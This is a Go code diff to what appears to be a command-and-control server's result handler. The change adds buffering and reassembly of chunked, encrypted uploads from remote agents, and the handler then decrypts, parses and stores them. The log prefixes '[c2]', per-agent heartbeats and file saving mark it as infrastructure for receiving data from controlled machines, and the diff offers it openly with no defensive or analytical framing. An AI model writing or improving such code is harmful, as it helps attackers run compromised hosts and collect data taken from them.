@@ -4,30 +4,115 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"io"
 	"log"
 	"net/http"
 	"os"
 	"path/filepath"
+	"strconv"
+	"strings"
 	"sync"
 )
 
 var resultsStore = make(map[string][]Result)
 var resultsMu sync.Mutex
 
+// chunkBuffers holds in-flight multi-part results keyed by agent ID.
+// Each entry is a slice sized to the chunk total; slots are filled as
+// chunks arrive, and the result is processed once every slot is non-empty.
+var chunkBuffers = make(map[string][]string)
+var chunkMu sync.Mutex
+
 func handleResult(w http.ResponseWriter, r *http.Request, agentID string) {
 	heartbeatAgent(agentID)
 
-	body, err := readEncryptedBody(r, agentID)
+	raw, err := io.ReadAll(r.Body)
 	if err != nil {
-		log.Printf("[c2] decrypt error from agent %s: %v", agentID, err)
-		http.Error(w, "decrypt error", http.StatusBadRequest)
+		http.Error(w, "read error", http.StatusBadRequest)
 		return
 	}
 
+	total := r.Header.Get("X-Chunk-Total")
+	idx := r.Header.Get("X-Chunk-Index")
+
+	// Single-part result: decrypt and process immediately.
+	if total == "" || total == "1" {
+		decrypted, derr := decryptFromAgent(agentID, string(raw))
+		if derr != nil {
+			log.Printf("[c2] decrypt error from agent %s: %v", agentID, derr)
+			http.Error(w, "decrypt error", http.StatusBadRequest)
+			return
+		}
+		processResult(agentID, []byte(decrypted))
+		w.WriteHeader(http.StatusOK)
+		return
+	}
+
+	// Multi-part result: buffer each encrypted chunk, decrypt only when complete.
+	t, _ := strconv.Atoi(total)
+	i, _ := strconv.Atoi(idx)
+	if t <= 0 {
+		decrypted, derr := decryptFromAgent(agentID, string(raw))
+		if derr != nil {
+			http.Error(w, "decrypt error", http.StatusBadRequest)
+			return
+		}
+		processResult(agentID, []byte(decrypted))
+		w.WriteHeader(http.StatusOK)
+		return
+	}
+
+	complete, full := bufferChunk(agentID, string(raw), i, t)
+	if !complete {
+		w.WriteHeader(http.StatusOK)
+		return
+	}
+
+	decrypted, derr := decryptFromAgent(agentID, full)
+	if derr != nil {
+		log.Printf("[c2] decrypt error (chunked) from agent %s: %v", agentID, derr)
+		http.Error(w, "decrypt error", http.StatusBadRequest)
+		return
+	}
+	processResult(agentID, []byte(decrypted))
+	w.WriteHeader(http.StatusOK)
+}
+
+// bufferChunk stores one encrypted chunk for agentID and returns (complete, full)
+// once every slot from 0..total-1 has arrived. full is the concatenation of all
+// chunks in order; the caller is responsible for decryption.
+func bufferChunk(agentID, raw string, idx, total int) (bool, string) {
+	chunkMu.Lock()
+	defer chunkMu.Unlock()
+
+	buf := chunkBuffers[agentID]
+	if buf == nil {
+		buf = make([]string, total)
+	}
+	if idx >= 0 && idx < total {
+		buf[idx] = raw
+	}
+	chunkBuffers[agentID] = buf
+
+	var full strings.Builder
+	complete := true
+	for _, c := range buf {
+		if c == "" {
+			complete = false
+			break
+		}
+		full.WriteString(c)
+	}
+	if complete {
+		delete(chunkBuffers, agentID)
+	}
+	return complete, full.String()
+}
+
+func processResult(agentID string, body []byte) {
 	var res Result
 	if err := json.Unmarshal(body, &res); err != nil {
 		log.Printf("[c2] unmarshal error from agent %s: %v", agentID, err)
-		http.Error(w, "invalid json", http.StatusBadRequest)
 		return
 	}
 
@@ -52,8 +137,6 @@ func handleResult(w http.ResponseWriter, r *http.Request, agentID string) {
 	if len(res.Errors) > 0 {
 		log.Printf("[c2] errors from %s: %v", agentID, res.Errors)
 	}
-
-	w.WriteHeader(http.StatusOK)
 }
 
 func saveFile(agentID string, res Result) {
